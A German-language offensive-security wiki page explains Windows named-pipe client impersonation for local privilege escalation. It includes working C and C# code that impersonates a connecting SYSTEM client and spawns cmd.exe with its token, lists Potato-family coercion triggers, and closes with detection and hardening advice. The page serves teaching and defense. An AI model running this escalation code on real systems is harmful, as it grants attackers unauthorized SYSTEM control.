# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ist ein lokaler Mechanismus zur Privilegieneskalation, der einem named-pipe Server-Thread erlaubt, den Sicherheitskontext eines Clients zu übernehmen, der sich mit ihm verbindet. In der Praxis kann ein Angreifer, der Code mit SeImpersonatePrivilege ausführen kann, einen privilegierten Client (z. B. einen SYSTEM-Dienst) dazu bringen, sich mit einer vom Angreifer kontrollierten Pipe zu verbinden, ImpersonateNamedPipeClient aufzurufen, das resultierende Token in ein Primary-Token zu duplizieren und einen Prozess als der Client zu starten (häufig NT AUTHORITY\SYSTEM).

Diese Seite konzentriert sich auf die Kerntechnik. Für vollständige Exploit-Ketten, die SYSTEM dazu bringen, sich mit Ihrer Pipe zu verbinden, siehe die Seiten zur Potato-Familie weiter unten.

## Kurzfassung
- Erstelle eine named pipe: \\.\pipe\<random> und warte auf eine Verbindung.
- Veranlasse eine privilegierte Komponente, sich damit zu verbinden (spooler/DCOM/EFSRPC/etc.).
- Lese mindestens eine Nachricht aus der Pipe, rufe dann ImpersonateNamedPipeClient auf.
- Öffne das Impersonation-Token des aktuellen Threads, DuplicateTokenEx(TokenPrimary) und CreateProcessWithTokenW/CreateProcessAsUser, um einen SYSTEM-Prozess zu erhalten.

## Anforderungen und wichtige APIs
- Typischerweise vom aufrufenden Prozess/Thread benötigte Privilegien:
- SeImpersonatePrivilege, um erfolgreich einen verbindenden Client zu impersonieren und CreateProcessWithTokenW zu verwenden.
- Alternativ kann man nach dem Impersonieren von SYSTEM CreateProcessAsUser verwenden, was SeAssignPrimaryTokenPrivilege und SeIncreaseQuotaPrivilege erfordern kann (diese sind erfüllt, wenn Sie SYSTEM impersonieren).
- Wichtige verwendete APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (es muss mindestens eine Nachricht vor der Impersonation gelesen werden)
- ImpersonateNamedPipeClient und RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation-Level: Um lokal nützliche Aktionen durchzuführen, muss der Client SecurityImpersonation erlauben (Standard für viele lokale RPC-/named-pipe-Clients). Clients können dieses mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION beim Öffnen der Pipe herabsetzen.

## Minimaler Win32-Workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Hinweise:
- Falls ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) zurückgibt, stelle sicher, dass du zuerst aus der Pipe liest und dass der Client die Impersonation nicht auf Identification level beschränkt hat.
- Verwende vorzugsweise DuplicateTokenEx mit SecurityImpersonation und TokenPrimary, um ein primäres Token zu erstellen, das für die Prozess-Erstellung geeignet ist.

## .NET schnelles Beispiel
In .NET kann NamedPipeServerStream über RunAsClient impersonieren. Sobald die Impersonation aktiv ist, dupliziere das Thread-Token und erstelle einen Prozess.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Häufige Auslöser/Zwangsmethoden, damit SYSTEM sich mit Ihrer named pipe verbindet
Diese Techniken zwingen privilegierte Dienste dazu, sich mit Ihrer named pipe zu verbinden, sodass Sie sie impersonate können:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM Aktivierung/NTLM-Reflection-Varianten (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Siehe detaillierte Nutzung und Kompatibilität hier:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Wenn Sie nur ein vollständiges Beispiel benötigen, wie man die named pipe erstellt und impersonating durchführt, um SYSTEM durch einen Service-Auslöser zu starten, siehe:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Fehlerbehebung und Fallstricke
- Sie müssen mindestens eine Nachricht aus der Pipe lesen, bevor Sie ImpersonateNamedPipeClient aufrufen; andernfalls erhalten Sie ERROR_CANNOT_IMPERSONATE (1368).
- Wenn sich der Client mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION verbindet, kann der Server nicht vollständig impersonate; prüfen Sie die Impersonation-Stufe des Tokens mittels GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW erfordert SeImpersonatePrivilege beim Aufrufer. Wenn das mit ERROR_PRIVILEGE_NOT_HELD (1314) fehlschlägt, verwenden Sie CreateProcessAsUser, nachdem Sie bereits SYSTEM impersoniert haben.
- Stellen Sie sicher, dass der Security Descriptor Ihrer Pipe dem Zielservice das Verbinden erlaubt, wenn Sie ihn härten; standardmäßig sind Pipes unter \\.\pipe gemäß der DACL des Servers zugänglich.

## Erkennung und Härtung
- Überwachen Sie die Erstellung und Verbindungen von named pipes. Sysmon Event IDs 17 (Pipe Created) und 18 (Pipe Connected) sind nützlich, um eine Basislinie legitimer Pipe-Namen zu erstellen und ungewöhnliche, zufällig aussehende Pipes zu erkennen, die Token-Manipulations-Ereignissen vorausgehen.
- Achten Sie auf Sequenzen: ein Prozess erstellt eine Pipe, ein SYSTEM-Service verbindet sich, dann erzeugt der erstellende Prozess einen Kindprozess als SYSTEM.
- Reduzieren Sie die Angriffsfläche, indem Sie SeImpersonatePrivilege von nicht notwendigen Servicekonten entfernen und unnötige Service-Logons mit hohen Rechten vermeiden.
- Defensive Entwicklung: Wenn Sie sich mit nicht vertrauenswürdigen named pipes verbinden, geben Sie SECURITY_SQOS_PRESENT mit SECURITY_IDENTIFICATION an, um zu verhindern, dass Server den Client vollständig impersonieren, es sei denn, es ist notwendig.

## Referenzen
- Windows: ImpersonateNamedPipeClient-Dokumentation (Anforderungen und Verhalten der Impersonation). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
